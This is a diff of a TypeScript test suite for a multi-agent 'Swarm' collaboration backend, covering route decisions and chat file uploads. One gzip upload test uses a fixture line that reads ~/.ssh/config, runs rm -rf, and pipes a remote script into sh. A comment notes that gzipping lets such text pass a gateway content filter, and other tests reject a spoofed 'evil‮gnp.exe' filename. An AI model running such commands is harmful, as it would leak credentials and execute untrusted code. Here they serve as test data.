-    expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBeNull()
-    await run(tab, { type: 'agent.startFailed', startId, error: 'Launch refused.' }, host, lead)
-    expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBe('failed')
-  })
-
-  it.each(['its owner removes it', 'its owner leaves the Swarm'] as const)('releases every queued route hold when its machine leaves because %s', async how => {
-    // The Lead runs elsewhere: a machine that hosts a project's Lead cannot leave the Swarm.
-    const tab = (await store.create(owner, randomUUID(), 'Pilot')).id
-    const leadMachineId = `lead-${randomUUID()}`
-    await db.machine.create({ data: { machineId: leadMachineId, userId: host.sub, apiKey: 'fixture-only', managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
-    await db.machineShare.create({ data: { machineId: leadMachineId, ownerId: host.sub, autonomousEnv: 'prod', emails: [owner.email] } })
-    const lead = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: leadMachineId, harnessId: randomUUID(),
-      name: 'Lead', configuration: config, lead: true })).result.agentId as string
-    const invitation = await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
-    await run(tab, { type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
-    await run(tab, { type: 'machine.contribute', machineId: 'test-host', name: 'Host', cwd: '/fixture/repo', engines: ['codex'], maxAgents: 4 }, host)
-    const machine = (await poolRows(store, host, 'test-host')).find(pool => pool.tabId === tab)!.machine
-    const team = await teamMachine('test-host')
-    await store.observeMachine(team.session, tab, 'test-host', { generation: machine.generation,
-      resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9, diskFreeBytes: 120e9, diskTotalBytes: 500e9,
-        projectDiskFreeBytes: 120e9, deviceType: 'Laptop', chip: 'Fixture', os: 'macOS', gpuPercent: null },
-      quotas: [], tools: {}, runningHarnessIds: [], stoppedHarnessIds: [], privacy: team.privacy })
-    const starts = [await routedStart(tab, lead), await routedStart(tab, lead)]
-    for (const { routeDecisionId } of starts) expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBeNull()
-
-    await run(tab, how === 'its owner removes it' ? { type: 'machine.remove', machineId: 'test-host' } : { type: 'member.remove', userId: host.sub }, host)
-
-    const state = (await store.read(owner, tab)).state
-    for (const { routeDecisionId, startId } of starts) {
-      expect(state.starts?.find(s => s.id === startId)?.error).toBe('Its machine was removed from the Swarm.')
-      expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBe('failed')
-    }
-  })
-
-  // Nightly reflection 10-30 (#2382): a task carries its review plan. The server opens and counts no review (project
-  // instructions, phase 4), so the plan is kept on the task through the Swarm's parts and said in its brief, which whoever
-  // opens its review reads.
-  it('keeps a task\'s review plan through a save and a read, and says it in the brief', async () => {
-    const { tab } = await fixture()
-    // A focus at its limit, saved, read back and saved again.
-    const focus = 'Check that a queued edit is never replayed twice after reconnect. '.repeat(40).slice(0, 2000).trim()
-    const task = { goal: 'Save edits offline.', changes: 'Queue edits.', constraints: 'No data loss.', owns: ['app/offline'], review: { focus, reviews: 2 as const } }
-    const checks = [{ description: 'Independent review', independent: true }]
-    const group = String((await run(tab, { type: 'conversation.create', title: 'Offline', task, checks })).result.conversationId)
-    const readBack = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.task!
-    expect(readBack.review).toEqual({ focus, reviews: 2 })
-    await run(tab, { type: 'work.define', conversationId: group, task: readBack, checks })
-    const stored = (await storedState(tab)).conversations.find(c => c.id === group)!
-    expect(stored.task!.review).toEqual({ focus, reviews: 2 })
-    expect(stored.brief.endsWith(`\n\nReview:\n${focus}\nTwo independent reviews, each by a different Reviewer.`)).toBe(true)
-  })
-
-  it('releases a started agent\'s route hold when the host stops it before assignment', async () => {
-    const { tab, lead } = await fixture()
-    const { routeDecisionId, startId } = await routedStart(tab, lead, 'reviewer')
-    const agentId = String((await run(tab, { type: 'agent.started', startId, harnessId: randomUUID(), configuration: config }, host, lead)).result.agentId)
-    expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBeNull()
-    await run(tab, { type: 'agent.release', agentId, decision: 'stop' }, host, lead)
-    const releaseId = (await store.read(owner, tab)).state.agents.find(agent => agent.id === agentId)!.releaseId!
-    await run(tab, { type: 'agent.remove', agentId, releaseId }, host, agentId)
-    expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBe('stopped')
   })
 
   it('names the failing field when a command is invalid', async () => {
@@ -2382,74 +1790,6 @@ describe('Super Tabs on a real Mongo replica set', () => {
     expect(response.json().error.message).toContain('command.request.requirements')
   })
 
-  it('closes a linked decision with the assignment outcome', async () => {
-    const { tab, lead } = await fixture()
-    const group = (await run(tab, { type: 'conversation.create', title: 'Build', brief: 'Build it.', checks: [{ description: 'Tests pass', independent: false }] })).result.conversationId as string
-    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Builder', configuration: config, lead: false })).result.agentId as string
-    const decision = { assessment: { difficulty: 'low', risk: 'low', why: 'Small.' },
-      candidates: [{ id: 'c0', kind: 'member', agentId: worker, machineId: 'test-host', engine: 'claude', model: 'sonnet', effort: 'medium', quality: 2, cost: 2, title: 'Builder', label: 'Member Builder' }],
-      excluded: [], floor: 1, notes: false, pick: 'c0', via: 'only', p: null, belowFloor: false, why: 'Only candidate.' }
-    const routeDecisionId = (await run(tab, { type: 'route.record', conversationId: group, decision } as Command, host, lead)).result.routeDecisionId as string
-    const assignmentId = (await run(tab, { type: 'work.assign', conversationId: group, agentId: worker, routeDecisionId } as Command, host, lead)).result.assignmentId as string
-    expect(await store.routeDecision(owner, tab, routeDecisionId)).toMatchObject({ assignmentId, final: { kind: 'member', agentId: worker } })
-    await run(tab, { type: 'route.record', conversationId: group, decision } as Command, host, lead)
-    expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBeNull()
-    await store.stopped(host, tab, assignmentId, 'native-stop-receipt')
-    expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBe('stopped')
-  })
-
-  it('keeps a decision open when the Lead stops its work to hand over to the candidate a person chose', async () => {
-    const { tab, lead } = await fixture()
-    const group = (await run(tab, { type: 'conversation.create', title: 'Build', brief: 'Build it.', checks: [{ description: 'Tests pass', independent: false }] })).result.conversationId as string
-    const add = async (name: string) => (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name, configuration: config, lead: false })).result.agentId as string
-    const picked = await add('Picked'), chosen = await add('Chosen')
-    const candidate = (id: string, agentId: string, title: string) => ({ id, kind: 'member', agentId, machineId: 'test-host', engine: 'codex',
-      model: 'fixture-model', effort: 'high', quality: 2, cost: 2, title, label: `Member ${title}` })
-    const decision = { assessment: { difficulty: 'low', risk: 'low', why: 'Small.' },
-      candidates: [candidate('c0', picked, 'Picked'), candidate('c1', chosen, 'Chosen')],
-      excluded: [], floor: 1, notes: false, pick: 'c0', via: 'jev', p: 0.9, belowFloor: false, why: 'Jev chose Picked.' }
-    const id = (await run(tab, { type: 'route.record', conversationId: group, decision } as Command, host, lead)).result.routeDecisionId as string
-    const first = (await run(tab, { type: 'work.assign', conversationId: group, agentId: picked, routeDecisionId: id } as Command, host, lead)).result.assignmentId as string
-    await run(tab, { type: 'route.override', decisionId: id, candidateId: 'c1', reason: 'Chosen knows this code.' } as Command)
-    // The person's Change reaches the Lead as a message to act on.
-    const rows = (await store.messages(owner, tab, group, {})).messages
-    const change = rows.at(-1)!
-    expect(change).toMatchObject({ source: { kind: 'route-override', by: 'person' }, text: expect.stringContaining('chose Chosen instead of Picked') })
-    expect((await store.deliveries(host, tab, lead)).map(d => d.messageId)).toContain(change.id)
-    // The first attempt is still running: no second link may overwrite its final.
-    await expect(run(tab, { type: 'work.assign', conversationId: group, agentId: chosen, routeDecisionId: id } as Command, host, lead))
-      .rejects.toMatchObject({ code: 'WORK_ACTIVE' })
-    await store.stopped(host, tab, first, 'handover-stop-receipt')
-    expect(await store.routeDecision(owner, tab, id)).toMatchObject({ outcome: null, assignmentId: null, final: null })
-    await run(tab, { type: 'agent.release', agentId: picked, decision: 'keep' }, host, lead)
-    const second = (await run(tab, { type: 'work.assign', conversationId: group, agentId: chosen, routeDecisionId: id } as Command, host, lead)).result.assignmentId as string
-    expect(await store.routeDecision(owner, tab, id)).toMatchObject({ outcome: null, assignmentId: second, final: { kind: 'member', agentId: chosen } })
-    const check = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.checks[0]!.id
-    await run(tab, { type: 'work.check', conversationId: group, assignmentId: second, checkId: check, passed: true, evidence: 'ok' } as Command, host, chosen)
-    await run(tab, { type: 'work.status', conversationId: group, assignmentId: second, status: 'done', result: 'Built.' } as Command, host, chosen)
-    expect(await store.routeDecision(owner, tab, id)).toMatchObject({ outcome: 'done', assignmentId: second })
-  })
-
-  it('records more than 30 routes in an hour: there is no hourly cap', async () => {
-    const { tab, lead } = await fixture()
-    const decision = { assessment: { difficulty: 'low', risk: 'low', why: 'Docs.' },
-      candidates: [{ id: 'c0', kind: 'new', machineId: 'test-host', engine: 'claude', model: 'haiku', effort: 'auto', quality: 1, cost: 1, title: 'New agent', label: 'New agent' }],
-      excluded: [], floor: 1, notes: false, pick: 'c0', via: 'only', p: null, belowFloor: false, why: 'Only candidate.' }
-    for (let i = 0; i < 30; i++) await run(tab, { type: 'route.record', conversationId: 'lead', decision } as Command, host, lead)
-    await expect(run(tab, { type: 'route.record', conversationId: 'lead', decision } as Command, host, lead)).resolves.toBeDefined()
-  })
-})
-
-it('allocates workgroup numbers transactionally and replays the same number after a lost reply', async () => {
-  const tab = (await store.create(owner, randomUUID(), 'Numbered work')).id
-  const operations = [randomUUID(), randomUUID(), randomUUID()]
-  const command: Command = { type: 'conversation.create', title: 'Work', brief: '', checks: [] }
-  const results = await Promise.all(operations.map(id => run(tab, command, owner, undefined, id)))
-  expect(results.map(r => r.result.number).sort()).toEqual([1, 2, 3])
-  expect((await run(tab, command, owner, undefined, operations[0])).result).toEqual(results[0]!.result)
-  expect((await store.read(owner, tab)).state.conversations.map(c => c.number)).toEqual([undefined, 1, 2, 3])
 })
 
 describe('Super Tab chat attachments', () => {
@@ -2483,15 +1823,28 @@ describe('Super Tab chat attachments', () => {
     const body = response.json()
     return { status: response.statusCode, code: body.error?.code ?? body.code, attachment: body.data?.attachment as Uploaded }
   }
-  const file = (tab: string, name = 'screen.png', bytes = new Uint8Array([1, 2, 3]), mime = 'image/png', conversationId = 'lead', user = owner, asAgentId?: string) =>
-    post(tab, [['conversationId', conversationId], ['file', bytes, name, mime]], user, asAgentId)
-  const send = (tab: string, attachmentIds: string[], user = owner, asAgentId?: string, text = '', operationId = randomUUID()) =>
-    attaching.execute(user, tab, { operationId, command: { type: 'message.send', conversationId: 'lead', text, replyTo: null, recipientIds: [], attachmentIds } }, asAgentId)
+  // A person sends files in their own chat with their agent, the owner in theirs with the PM; an agent, in the project's channel: only
+  // agents post in a project's channel and its tasks' chats (agentsOnly.test.ts).
+  const file = async (tab: string, name = 'screen.png', bytes = new Uint8Array([1, 2, 3]), mime = 'image/png', conversationId?: string, user = owner, asAgentId?: string) =>
+    post(tab, [['conversationId', conversationId ?? await pmChat(tab)], ['file', bytes, name, mime]], user, asAgentId)
+  const send = async (tab: string, attachmentIds: string[], user = owner, asAgentId?: string, text = '', operationId = randomUUID(), conversationId?: string) =>
+    attaching.execute(user, tab, { operationId, command: { type: 'message.send', conversationId: conversationId ?? (asAgentId ? 'lead' : await pmChat(tab)), text,
+      replyTo: null, recipientIds: [], attachmentIds } }, asAgentId)
+  /** [user]'s own chat, before its agent joins, on their own computer. */
+  const ownChat = async (tab: string, user: AuthUser) => {
+    const machineId = `mac-${user.sub}`
+    await db.machine.upsert({ where: { machineId }, update: {}, create: { machineId, userId: user.sub, apiKey: `fixture-${machineId}`, managerId: 'fixture',
+      autonomousEnv: 'prod', authMode: 'remote' } })
+    return String((await attaching.execute(user, tab, { operationId: randomUUID(), command: { type: 'agent.new', kind: 'regular', machineId, engine: 'codex',
+      name: 'Ada', local: true } })).result.conversationId)
+  }
   const objectKey = (url: string) => url.slice('https://cdn.example.test/'.length)
   // Every read adds a signed link of its own to each file (fileLinks.ts), on the bucket's own host.
   const signed = (path: string) => new RegExp(`^https://storage\\.memory\\.test/${path}\\?expires=\\d+&signature=[0-9a-f]{64}$`)
   /** A file as two reads hand it: the same object, each with a link of its own read. */
   const sameFile = (file: Uploaded) => ({ ...file, link: expect.stringMatching(signed(objectKey(file.url).replaceAll('.', '\\.'))), expiresAt: expect.any(Number) })
+  /** A file as a message keeps it: a read signs a fresh link for it (fileLinks.ts), so the upload answer's link is not part of it. */
+  const keptFile = ({ link: _link, expiresAt: _expiresAt, ...file }: Uploaded) => file
 
   it('keeps a credential out of a file\'s name, which the chat shows like the message', async () => {
     const { tab } = await fixture()
@@ -2501,6 +1854,22 @@ describe('Super Tab chat attachments', () => {
     expect(attachment.name).toBe('deploy-[credential removed].txt')
     expect(attachment.url).not.toContain(token)
     expect(JSON.stringify(await db.superTabAttachment.findMany({ where: { tabId: tab } }))).not.toContain(token)
+  })
+
+  // Swarm v4: a plain agent is in no project and joins a project's channel by posting there (postable). Its first file there comes before
+  // that post: the upload only asks whether it may post, on the Swarm as the read cache holds it, which nothing may change.
+  it('takes a file from a plain agent that has not posted in the project channel yet, which it joins by the message that sends it', async () => {
+    const { tab, lead } = await fixture()
+    const chat = String((await run(tab, { type: 'agent.new', kind: 'regular', machineId: OWN_MAC, engine: 'codex', name: 'Ada', local: true })).result.conversationId)
+    const ada = String((await run(tab, { type: 'agent.add', conversationId: chat, machineId: OWN_MAC, harnessId: randomUUID(), name: 'Ada', configuration: config, lead: false })).result.agentId)
+    const members = async () => (await store.read(owner, tab)).state.conversations.find(c => c.id === 'lead')!.agentIds
+    expect(await members()).toEqual([lead])
+    const uploaded = await file(tab, 'plan.txt', new Uint8Array([1, 2, 3]), 'text/plain', 'lead', owner, ada)
+    expect(uploaded).toMatchObject({ status: 200, attachment: { name: 'plan.txt' } })
+    // Asking changed nothing: it joins by posting.
+    expect(await members()).toEqual([lead])
+    await send(tab, [uploaded.attachment.id], owner, ada, 'The plan.')
+    expect(await members()).toEqual([lead, ada])
   })
 
   it('streams one file into the bucket under a random key and answers its metadata', async () => {
@@ -2529,21 +1898,47 @@ describe('Super Tab chat attachments', () => {
   it('refuses an oversized, second, misordered or hidden-named file, and a server with no bucket', async () => {
     const { tab } = await fixture()
     const before = files.objects.size
-    const big = await post(tab, [['conversationId', 'lead'], ['file', new Uint8Array(10 * 1024 * 1024 + 1), 'big.bin', 'application/octet-stream']])
+    const big = await post(tab, [['conversationId', await pmChat(tab)], ['file', new Uint8Array(10 * 1024 * 1024 + 1), 'big.bin', 'application/octet-stream']])
     expect(big).toMatchObject({ status: 413, code: 'ATTACHMENT_TOO_LARGE' })
     expect(await file(tab, 'exact.bin', new Uint8Array(10 * 1024 * 1024), 'application/octet-stream')).toMatchObject({ status: 200 })
-    expect(await post(tab, [['conversationId', 'lead'], ['file', new Uint8Array(1), 'a.png', 'image/png'], ['file', new Uint8Array(1), 'b.png', 'image/png']]))
+    expect(await post(tab, [['conversationId', await pmChat(tab)], ['file', new Uint8Array(1), 'a.png', 'image/png'], ['file', new Uint8Array(1), 'b.png', 'image/png']]))
       .toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
-    expect(await post(tab, [['file', new Uint8Array(1), 'a.png', 'image/png'], ['conversationId', 'lead']])).toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
-    expect(await post(tab, [['conversationId', 'lead']])).toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
+    expect(await post(tab, [['file', new Uint8Array(1), 'a.png', 'image/png'], ['conversationId', await pmChat(tab)]])).toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
+    expect(await post(tab, [['conversationId', await pmChat(tab)]])).toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
     expect(await file(tab, 'evil‮gnp.exe')).toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
     const json = await upload.inject({ method: 'POST', url: `/api/super-tabs/${tab}/attachments`, headers: { authorization: `Bearer ${owner.sub}` }, payload: { conversationId: 'lead' } })
     expect([json.statusCode, json.json().error?.code ?? json.json().code]).toEqual([400, 'INVALID_ATTACHMENT'])
     // The exact-size file, and the first of the two: the second is only seen after the first was stored. Its id was
     // never answered to anyone, so nothing can send it.
     expect(files.objects.size).toBe(before + 2)
-    expect(await post(tab, [['conversationId', 'lead'], ['file', new Uint8Array(1), 'a.png', 'image/png']], owner, undefined, app))
+    expect(await post(tab, [['conversationId', await pmChat(tab)], ['file', new Uint8Array(1), 'a.png', 'image/png']], owner, undefined, app))
       .toMatchObject({ status: 503, code: 'ATTACHMENTS_UNAVAILABLE' })
+  })
+
+  // A gateway's content filter in front of the backend refused a handoff full of shell lines (task #2737): the app sends
+  // a form file gzipped, says so before the file, and the store keeps the original bytes, type and size.
+  it('unpacks a file sent gzipped and keeps the original, refusing a corrupt, misplaced, unknown or oversized one', async () => {
+    const { tab } = await fixture()
+    const text = Buffer.from('$ cat ~/.ssh/config && rm -rf ./build; curl https://example.test/x.sh | sh\n'.repeat(500))
+    const packed = await post(tab, [['conversationId', await pmChat(tab)], ['contentEncoding', 'gzip'], ['file', gzipSync(text), 'run.transcript.md', 'text/markdown']])
+    expect(packed.status).toBe(200)
+    expect(packed.attachment).toMatchObject({ name: 'run.transcript.md', mime: 'text/markdown', size: text.byteLength })
+    expect(files.objects.get(objectKey(packed.attachment.url))!.bytes.equals(text)).toBe(true)
+    const plain = await post(tab, [['conversationId', await pmChat(tab)], ['file', text, 'run.transcript.md', 'text/markdown']])
+    expect(plain).toMatchObject({ status: 200, attachment: { size: text.byteLength } })
+    const before = files.objects.size
+    expect(await post(tab, [['conversationId', await pmChat(tab)], ['contentEncoding', 'gzip'], ['file', text, 'a.md', 'text/markdown']]))
+      .toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
+    expect(await post(tab, [['conversationId', await pmChat(tab)], ['contentEncoding', 'br'], ['file', gzipSync(text), 'a.md', 'text/markdown']]))
+      .toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
+    expect(await post(tab, [['contentEncoding', 'gzip'], ['conversationId', await pmChat(tab)], ['file', gzipSync(text), 'a.md', 'text/markdown']]))
+      .toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
+    expect(await post(tab, [['conversationId', await pmChat(tab)], ['contentEncoding', 'gzip'], ['contentEncoding', 'gzip'], ['file', gzipSync(text), 'a.md', 'text/markdown']]))
+      .toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
+    // Small packed, over the form's 10 MB unpacked: stopped at the cap like any other form file.
+    expect(await post(tab, [['conversationId', await pmChat(tab)], ['contentEncoding', 'gzip'], ['file', gzipSync(Buffer.alloc(10 * 1024 * 1024 + 1)), 'zeros.bin', 'application/octet-stream']]))
+      .toMatchObject({ status: 413, code: 'ATTACHMENT_TOO_LARGE' })
+    expect(files.objects.size).toBe(before)
   })
 
   it('answers a bucket failure as unavailable, not as a server error', async () => {
@@ -2555,24 +1950,25 @@ describe('Super Tab chat attachments', () => {
   })
 
   it('sends uploaded files once, with empty text, and delivers their metadata to the agent', async () => {
-    const { tab, lead } = await fixture()
-    const { attachment } = await file(tab, 'log.txt', new Uint8Array(10), 'text/plain')
-    const sent = await send(tab, [attachment.id])
-    const row = (await attaching.messages(owner, tab, 'lead', {})).messages.find(m => m.id === sent.result.messageId)!
+    // To the owner's own agent, which reads their chat (the fixture PM runs on host's computer).
+    const { tab } = await fixture()
+    const { ada, chat } = await ownAgent(tab)
+    const { attachment } = await file(tab, 'log.txt', new Uint8Array(10), 'text/plain', chat)
+    const sent = await send(tab, [attachment.id], owner, undefined, '', randomUUID(), chat)
+    const row = (await attaching.messages(owner, tab, chat, {})).messages.find(m => m.id === sent.result.messageId)!
     expect(row).toMatchObject({ text: '', attachments: [sameFile(attachment)] })
-    const delivery = (await attaching.deliveries(host, tab, lead)).find(d => d.messageId === sent.result.messageId)!
-    expect((await attaching.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: randomUUID() })).message!.attachments).toEqual([sameFile(attachment)])
-    await expect(send(tab, [attachment.id])).rejects.toMatchObject({ code: 'ATTACHMENT_USED' })
-    await expect(send(tab, [])).rejects.toMatchObject({ code: 'TEXT_REQUIRED' })
+    const delivery = (await attaching.deliveries(owner, tab, ada)).find(d => d.messageId === sent.result.messageId)!
+    expect((await attaching.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId: randomUUID() })).message!.attachments).toEqual([sameFile(attachment)])
+    await expect(send(tab, [attachment.id], owner, undefined, '', randomUUID(), chat)).rejects.toMatchObject({ code: 'ATTACHMENT_USED' })
+    await expect(send(tab, [], owner, undefined, '', randomUUID(), chat)).rejects.toMatchObject({ code: 'TEXT_REQUIRED' })
   })
 
   it('lets only the uploading actor send a file, only in its conversation, and an agent attach from its host', async () => {
     const { tab, lead } = await fixture()
     await invite(tab)
     const mine = (await file(tab)).attachment
-    await expect(send(tab, [mine.id], peer)).rejects.toMatchObject({ code: 'ATTACHMENT_UNAVAILABLE' })
-    const group = String((await run(tab, { type: 'conversation.create', title: 'Elsewhere', brief: '', checks: [] })).result.conversationId)
-    const elsewhere = (await file(tab, 'x.png', new Uint8Array(5), 'image/png', group)).attachment
+    await expect(send(tab, [mine.id], peer, undefined, '', randomUUID(), await ownChat(tab, peer))).rejects.toMatchObject({ code: 'ATTACHMENT_UNAVAILABLE' })
+    const elsewhere = (await file(tab, 'x.png', new Uint8Array(5), 'image/png', await ownChat(tab, owner))).attachment
     await expect(send(tab, [elsewhere.id])).rejects.toMatchObject({ code: 'ATTACHMENT_UNAVAILABLE' })
     await expect(send(tab, ['missing-attachment'])).rejects.toMatchObject({ code: 'ATTACHMENT_UNAVAILABLE' })
     expect(await file(tab, 'a.png', new Uint8Array(1), 'image/png', 'lead', peer, lead)).toMatchObject({ status: 403, code: 'FORBIDDEN' })
@@ -2586,7 +1982,8 @@ describe('Super Tab chat attachments', () => {
   type Link = { id: string; url: string; method: string; headers: Record<string, string>; expiresAt: number }
   const linkFor = async (tab: string, body: Record<string, unknown>, user = owner, asAgentId?: string) => {
     const response = await upload.inject({ method: 'POST', url: `/api/super-tabs/${tab}/attachments/uploads${asAgentId ? `?asAgentId=${asAgentId}` : ''}`,
-      headers: { authorization: `Bearer ${user.sub}` }, payload: { conversationId: 'lead', name: 'AC4 - 26 Oct v2.step', mime: 'application/octet-stream', ...body } })
+      headers: { authorization: `Bearer ${user.sub}` }, payload: { conversationId: asAgentId ? 'lead' : await pmChat(tab), name: 'AC4 - 26 Oct v2.step',
+        mime: 'application/octet-stream', ...body } })
     const answer = response.json()
     return { status: response.statusCode, code: answer.error?.code ?? answer.code, message: answer.error?.message as string | undefined, upload: answer.data?.upload as Link }
   }
@@ -2603,15 +2000,17 @@ describe('Super Tab chat attachments', () => {
   })())
 
   it('takes a 256 MB file straight to the bucket on a one-write link, and delivers it to the agent once checked', async () => {
-    const { tab, lead } = await fixture()
+    // To the owner's own agent, which reads their chat (the fixture PM runs on host's computer).
+    const { tab } = await fixture()
+    const { ada, chat } = await ownAgent(tab)
     const size = 256 * 1024 * 1024
-    const { status, upload: link } = await linkFor(tab, { size })
+    const { status, upload: link } = await linkFor(tab, { size, conversationId: chat })
     expect(status).toBe(200)
     expect(link.method).toBe('PUT')
     expect(link.expiresAt - Date.now()).toBeLessThanOrEqual(10 * 60_000)
     expect(link.headers).toMatchObject({ 'x-goog-content-length-range': `${size},${size}`, 'x-goog-if-generation-match': '0', 'content-type': 'application/octet-stream' })
     // Not sendable, by this server or an older one, until the server has seen the bytes.
-    await expect(send(tab, [link.id])).rejects.toMatchObject({ code: 'ATTACHMENT_UNAVAILABLE' })
+    await expect(send(tab, [link.id], owner, undefined, '', randomUUID(), chat)).rejects.toMatchObject({ code: 'ATTACHMENT_UNAVAILABLE' })
     expect(await complete(tab, link.id)).toMatchObject({ status: 409, code: 'UPLOAD_INCOMPLETE' })
     expect(await files.receive(link.url, link.headers, streamOf(size))).toBe(200)
     const done = await complete(tab, link.id)
@@ -2622,9 +2021,9 @@ describe('Super Tab chat attachments', () => {
     expect(files.objects.get(objectKey(done.attachment.url))).toMatchObject({ contentType: 'application/octet-stream', contentDisposition: "attachment; filename*=UTF-8''AC4%20-%2026%20Oct%20v2.step" })
     // A lost answer is answered again the same way.
     expect(await complete(tab, link.id)).toEqual(done)
-    const sent = await send(tab, [link.id])
-    const delivery = (await attaching.deliveries(host, tab, lead)).find(d => d.messageId === sent.result.messageId)!
-    expect((await attaching.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: randomUUID() })).message!.attachments).toEqual([sameFile(done.attachment)])
+    const sent = await send(tab, [link.id], owner, undefined, '', randomUUID(), chat)
+    const delivery = (await attaching.deliveries(owner, tab, ada)).find(d => d.messageId === sent.result.messageId)!
+    expect((await attaching.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId: randomUUID() })).message!.attachments).toEqual([sameFile(done.attachment)])
     files.objects.delete(objectKey(done.attachment.url))
   })
 
@@ -2636,7 +2035,7 @@ describe('Super Tab chat attachments', () => {
     expect(await linkFor(tab, { size: 1.5 })).toMatchObject({ status: 400 })
     expect(await linkFor(tab, { size: 5, name: 'evil‮gnp.exe' })).toMatchObject({ status: 400, code: 'INVALID_ATTACHMENT' })
     expect(await db.superTabAttachment.count({ where: { tabId: tab } })).toBe(rows)
-    const old = await post(tab, [['conversationId', 'lead'], ['file', new Uint8Array(10 * 1024 * 1024 + 1), 'big.bin', 'application/octet-stream']])
+    const old = await post(tab, [['conversationId', await pmChat(tab)], ['file', new Uint8Array(10 * 1024 * 1024 + 1), 'big.bin', 'application/octet-stream']])
     expect(old).toMatchObject({ status: 413, code: 'ATTACHMENT_TOO_LARGE' })
   })
 
@@ -2658,7 +2057,7 @@ describe('Super Tab chat attachments', () => {
     const agents = await linkFor(tab, { size: 11 }, host, lead)
     expect(agents.status).toBe(200)
     // Access gone while the bytes moved: the upload is not made sendable.
-    const { upload: peers } = await linkFor(tab, { size: 3, name: 'notes.txt', mime: 'text/plain' }, peer)
+    const { upload: peers } = await linkFor(tab, { size: 3, name: 'notes.txt', mime: 'text/plain', conversationId: await ownChat(tab, peer) }, peer)
     expect(await files.receive(peers.url, peers.headers, Buffer.from('abc'))).toBe(200)
     await run(tab, { type: 'member.remove', userId: peer.sub })
     expect((await complete(tab, peers.id, peer)).status).toBeGreaterThanOrEqual(403)
@@ -2687,7 +2086,16 @@ describe('Super Tab chat attachments', () => {
     const old = (n: number, size = 1) => db.superTabAttachment.createMany({ data: Array.from({ length: n }, () => ({ id: randomUUID().replaceAll('-', '').slice(0, 24),
       tabId: tab, conversationId: 'lead', actorKey: `person:${owner.sub}`, name: 'x', mime: 'text/plain', size, objectKey: 'x' })) })
     await old(190)
-    const answers = await Promise.all(Array.from({ length: 60 }, () => linkFor(tab, { size: 11 })))
+    // 60 at once all write the sender's one allowance row, so a few may run out of the server's 8 tries and get the 503
+    // SWARM_BUSY every client retries (superTabs/retry.ts). Retry it here as clients do: the limits must hold either way.
+    // It failed CI twice on 11-04 (#2888, #2926) when the test counted that answer as a failure.
+    const linkAsClients = async () => {
+      for (let tries = 1; ; tries++) {
+        const answer = await linkFor(tab, { size: 11 })
+        if (answer.status !== 503 || answer.code !== 'SWARM_BUSY' || tries === 5) return answer
+      }
+    }
+    const answers = await Promise.all(Array.from({ length: 60 }, linkAsClients))
     expect(answers.filter(a => a.status === 200)).toHaveLength(10)
     expect(answers.filter(a => a.status === 429).every(a => a.code === 'RATE_LIMITED')).toBe(true)
     expect(answers.filter(a => a.status !== 200 && a.status !== 429)).toEqual([])
@@ -2790,23 +2198,25 @@ describe('Super Tab chat attachments', () => {
   })
 
   // Chat file links stop working when access ends (security review of Delete Swarm, 10-31; fileLinks.ts).
-  const fresh = async (tab: string, messageId: string, attachmentId: string, user = owner, conversationId = 'lead', asAgentId?: string) => {
-    const response = await upload.inject({ url: `/api/super-tabs/${tab}/conversations/${conversationId}/messages/${messageId}/attachments/${attachmentId}${asAgentId ? `?asAgentId=${asAgentId}` : ''}`,
+  const fresh = async (tab: string, messageId: string, attachmentId: string, user = owner, conversationId?: string, asAgentId?: string) => {
+    const response = await upload.inject({ url: `/api/super-tabs/${tab}/conversations/${conversationId ?? await pmChat(tab)}/messages/${messageId}/attachments/${attachmentId}${asAgentId ? `?asAgentId=${asAgentId}` : ''}`,
       headers: { authorization: `Bearer ${user.sub}` } })
     return { status: response.statusCode, body: response.body, attachment: response.json().data?.attachment as Uploaded | undefined }
   }
-  const sentFile = async (tab: string, body = 'hello') => {
-    const { attachment } = await file(tab, 'notes.txt', Buffer.from(body), 'text/plain')
-    const messageId = String((await send(tab, [attachment.id])).result.messageId)
+  /** A file sent by the owner to their PM, or by [lead] in the project's channel. */
+  const sentFile = async (tab: string, body = 'hello', lead?: string) => {
+    const { attachment } = await file(tab, 'notes.txt', Buffer.from(body), 'text/plain', lead ? 'lead' : undefined, lead ? host : owner, lead)
+    const messageId = String((await send(tab, [attachment.id], lead ? host : owner, lead)).result.messageId)
     return { attachment, messageId }
   }
-  const read = async (tab: string, messageId: string, user = owner, asAgentId?: string) =>
-    (await attaching.messages(user, tab, 'lead', { messageId }, asAgentId)).messages[0]!.attachments as unknown as Uploaded[]
+  const read = async (tab: string, messageId: string, user = owner, asAgentId?: string, conversationId?: string) =>
+    (await attaching.messages(user, tab, conversationId ?? await pmChat(tab), { messageId }, asAgentId)).messages[0]!.attachments as unknown as Uploaded[]
 
